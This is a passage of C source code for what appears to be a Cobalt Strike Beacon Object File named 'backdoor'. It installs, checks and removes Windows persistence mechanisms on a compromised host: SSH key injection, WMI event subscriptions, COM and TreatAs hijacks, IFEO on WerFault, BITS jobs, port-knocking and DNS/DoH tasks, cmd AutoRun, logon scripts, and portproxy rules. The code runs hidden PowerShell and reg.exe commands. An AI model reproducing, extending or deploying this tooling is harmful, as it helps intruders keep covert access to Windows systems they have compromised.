        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -C \""
        "$n='%s';"
        "foreach($f in @($env:USERPROFILE+'\\.ssh\\authorized_keys','C:\\ProgramData\\ssh\\administrators_authorized_keys')){"
        "if(Test-Path $f){$t=Get-Content $f | ? { $_ -notmatch [regex]::Escape($n) }; Set-Content -Path $f -Value $t -Encoding ASCII}"
        "}\"",
        needle);
    spawn(g_cmd);
    BeaconPrintf(CALLBACK_OUTPUT, "[clean sshkey] stripped needle from user+ProgramData keys\n");
}

static void clean_knock(void)
{
    zap_intel("ipma-spa.ps1");
    zap_run(TASK_SPA);
    zap_task(TASK_SPA);
    zap_fw(FW_SPA);
    spawn("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -C \"Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -match 'ipma-spa' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }\"");
}

static void clean_dns(void)
{
    zap_intel("ipma-dns.ps1");
    zap_task(TASK_DNS);
}

static void clean_doh(void)
{
    zap_intel("ipma-doh.ps1");
    zap_task(TASK_DOH);
}

static void clean_bits(void)
{
    spawn("C:\\Windows\\System32\\bitsadmin.exe /cancel MaelBdBits");
}

static void clean_com(void)
{
    zap_reg("HKCU\\Software\\Classes\\CLSID\\" CLSID_CTF "\\LocalServer32");
    zap_reg("HKCU\\Software\\Classes\\CLSID\\" CLSID_CACHE "\\LocalServer32");
    zap_reg("HKCU\\Software\\Classes\\CLSID\\" CLSID_BD "\\LocalServer32");
    zap_reg("HKCU\\Software\\Classes\\CLSID\\" CLSID_BD);
    zap_task(TASK_COM);
}

static void clean_treatas(void)
{
    zap_reg("HKCU\\Software\\Classes\\CLSID\\" CLSID_CTF "\\TreatAs");
    zap_reg("HKCU\\Software\\Classes\\CLSID\\" CLSID_BD "\\LocalServer32");
}

static void clean_logon(void)
{
    spawn("C:\\Windows\\System32\\reg.exe delete HKCU\\Environment /v UserInitMprLogonScript /f");
}

static void clean_startup(void)
{
    char p[MAX_PATH];
    if (join_env(p, sizeof(p), "APPDATA", "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IpmaUpdate.cmd"))
        zap_file(p);
    if (join_env(p, sizeof(p), "APPDATA", "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IpmaUpdate.vbs"))
        zap_file(p);
    if (join_env(p, sizeof(p), "APPDATA", "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IpmaUpdate.ps1"))
        zap_file(p);
}

static void clean_profile(void)
{
    spawn("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -C \"$p=$env:USERPROFILE+'\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1'; if(Test-Path $p){ Get-Content $p | Where-Object { $_ -notmatch 'ipma-upd|ipma-reg|PowerManager|MaelBd' } | Set-Content $p -Encoding ASCII }\"");
}

static void clean_active(void)
{
    zap_reg("HKCU\\Software\\Microsoft\\Active Setup\\Installed Components\\" CLSID_BD);
}

static void clean_autorun(void)
{
    spawn("C:\\Windows\\System32\\reg.exe delete \"HKCU\\Software\\Microsoft\\Command Processor\" /v AutoRun /f");
}

static void clean_mshta(void)
{
    zap_intel("ipma-hta.cmd");
    zap_intel("ipma-hta.ps1");
    zap_run(TASK_HTA);
    zap_task(TASK_HTA);
}

static void clean_winrm(void)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[clean winrm] fw only. WinRM service stays (LAN).\n");
    zap_fw(FW_WINRM);
}

static void clean_proxy(void)
{
    spawn("C:\\Windows\\System32\\reg.exe delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp /v 127.0.0.1/2200 /f");
    spawn("C:\\Windows\\System32\\reg.exe delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\\tcp /v 10.66.0.3/2200 /f");
    iphlp_reload();
}

static void clean_wmi(void)
{
    zap_intel("ipma-wmi.ps1");
    spawn("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -C \"$ns='root\\subscription';$n='MaelBdWmi'; Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -EA 0 | Where-Object { $_.Filter -match $n } | ForEach-Object { $_.Delete() }; Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -EA 0 | Where-Object { $_.Name -eq $n } | ForEach-Object { $_.Delete() }; Get-WmiObject -Namespace $ns -Class __EventFilter -EA 0 | Where-Object { $_.Name -eq $n } | ForEach-Object { $_.Delete() }\"");
}

static void clean_time(void)
{
    zap_reg("HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\MaelBdTime");
}

static void clean_sshd(void)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[clean sshd] fw overlay only. sshd stays (LAN).\n");
    zap_fw(FW_SSH);
}

static void clean_ifeo(void)
{
    zap_reg("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\WerFault.exe");
    zap_reg("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\WerFault.exe");
}

static void cmd_clean(const char *id, const char *extra)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[clean] id=%s il=0x%X\n",
        nonempty(id) ? id : "?", current_il());
    if (!nonempty(id) || eq(id, "help")) {
        BeaconPrintf(CALLBACK_OUTPUT, "[clean] usage: backdoor clean <id>|all\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[clean] sshd/winrm: fw only, services stay.\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[clean] sshkey: pass needle, never wipe whole authorized_keys.\n");
        return;
    }
    if (eq(id, "all")) {
        clean_wake();
        clean_ssh();
        clean_knock();
        clean_dns();
        clean_doh();
        clean_bits();
        clean_com();
        clean_treatas();
        clean_logon();
        clean_startup();
        clean_profile();
        clean_active();
        clean_autorun();
        clean_mshta();
        clean_winrm();
        clean_proxy();
        clean_wmi();
        clean_time();
        clean_sshd();
        clean_ifeo();
        BeaconPrintf(CALLBACK_OUTPUT, "[clean] all done (sshkey skipped — pass needle)\n");
        return;
    }
    if (eq(id, "wake"))
        clean_wake();
    else if (eq(id, "ssh"))
        clean_ssh();
    else if (eq(id, "sshkey"))
        clean_sshkey(extra);
    else if (eq(id, "knock") || eq(id, "spa") || eq(id, "magic"))
        clean_knock();
    else if (eq(id, "dns"))
        clean_dns();
    else if (eq(id, "doh"))
        clean_doh();
    else if (eq(id, "bits"))
        clean_bits();
    else if (eq(id, "com"))
        clean_com();
    else if (eq(id, "treatas"))
        clean_treatas();
    else if (eq(id, "logon"))
        clean_logon();
    else if (eq(id, "startup"))
        clean_startup();
    else if (eq(id, "profile"))
        clean_profile();
    else if (eq(id, "active"))
        clean_active();
    else if (eq(id, "autorun"))
        clean_autorun();
    else if (eq(id, "mshta"))
        clean_mshta();
    else if (eq(id, "winrm"))
        clean_winrm();
    else if (eq(id, "proxy"))
        clean_proxy();
    else if (eq(id, "wmi"))
        clean_wmi();
    else if (eq(id, "time"))
        clean_time();
    else if (eq(id, "sshd"))
        clean_sshd();
    else if (eq(id, "ifeo"))
        clean_ifeo();
    else {
        BeaconPrintf(CALLBACK_ERROR, "[clean] unknown id '%s'\n", id);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[clean] done %s\n", id);
}

static void cmd_apply(const char *id, const char *a, const char *b, const char *c)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[apply] id=%s a=%s b=%s il=0x%X\n",
        nonempty(id) ? id : "?", nonempty(a) ? a : "-", nonempty(b) ? b : "-", current_il());
    if (!nonempty(id)) {
        BeaconPrintf(CALLBACK_ERROR, "[apply] need id — backdoor list\n");
        return;
    }
    if (eq(id, "wake"))
        apply_wake(a);
    else if (eq(id, "ssh"))
        apply_ssh(a, b);
    else if (eq(id, "sshkey"))
        apply_sshkey(a);
    else if (eq(id, "knock") || eq(id, "spa") || eq(id, "magic"))
        apply_knock(a, b, c);
    else if (eq(id, "dns"))
        apply_dns(a);
    else if (eq(id, "doh"))
        apply_doh(a);
    else if (eq(id, "bits"))
        apply_bits(a);
    else if (eq(id, "com"))
        apply_com(a);
    else if (eq(id, "treatas"))
        apply_treatas(a);
    else if (eq(id, "logon"))
        apply_logon(a);
    else if (eq(id, "startup"))
        apply_startup(a);
    else if (eq(id, "profile"))
        apply_profile(a);
    else if (eq(id, "active"))
        apply_active(a);
    else if (eq(id, "autorun"))
        apply_autorun(a);
    else if (eq(id, "mshta"))
        apply_mshta(a);
    else if (eq(id, "winrm"))
        apply_winrm(a);
    else if (eq(id, "proxy"))
        apply_proxy(a, b);
    else if (eq(id, "wmi"))
        apply_wmi(a);
    else if (eq(id, "time"))
        apply_time(a);
    else if (eq(id, "sshd"))
        apply_sshd(a);
    else if (eq(id, "ifeo"))
        apply_ifeo(a);
    else
        BeaconPrintf(CALLBACK_ERROR, "[apply] unknown id '%s'\n", id);
}

void go(char *args, int len)
{
    datap parser;
    char *cmd;
    char *a;
    char *b;
    char *c;
    char *d;

    BeaconDataParse(&parser, args, len);
    cmd = BeaconDataExtract(&parser, NULL);
    a = BeaconDataExtract(&parser, NULL);
    b = BeaconDataExtract(&parser, NULL);
    c = BeaconDataExtract(&parser, NULL);
    d = BeaconDataExtract(&parser, NULL);
    if (!nonempty(cmd))
        cmd = "help";

    if (eq(cmd, "help") || eq(cmd, "-h") || eq(cmd, "/?"))
        cmd_help();
    else if (eq(cmd, "list") || eq(cmd, "ls"))
        cmd_list();
    else if (eq(cmd, "paths") || eq(cmd, "path") || eq(cmd, "hunt"))
        cmd_paths();
    else if (eq(cmd, "priv") || eq(cmd, "whoami") || eq(cmd, "token"))
        cmd_priv();
    else if (eq(cmd, "status") || eq(cmd, "info"))
        cmd_status();
    else if (eq(cmd, "check"))
        cmd_check(a);
    else if (eq(cmd, "apply"))
        cmd_apply(a, b, c, d);
    else if (eq(cmd, "clean") || eq(cmd, "clear") || eq(cmd, "rm"))
        cmd_clean(a, b);
    else if (eq(cmd, "wake") || eq(cmd, "ssh") || eq(cmd, "sshkey") || eq(cmd, "winrm")
             || eq(cmd, "wmi") || eq(cmd, "proxy") || eq(cmd, "bits") || eq(cmd, "com")
             || eq(cmd, "dns") || eq(cmd, "doh") || eq(cmd, "logon") || eq(cmd, "time")
             || eq(cmd, "knock") || eq(cmd, "spa") || eq(cmd, "magic") || eq(cmd, "treatas")
             || eq(cmd, "startup") || eq(cmd, "profile") || eq(cmd, "active") || eq(cmd, "autorun")
             || eq(cmd, "mshta") || eq(cmd, "sshd") || eq(cmd, "ifeo"))
        cmd_check(cmd);
    else
        BeaconPrintf(CALLBACK_ERROR, "[backdoor] unknown '%s' — backdoor help\n", cmd);
}
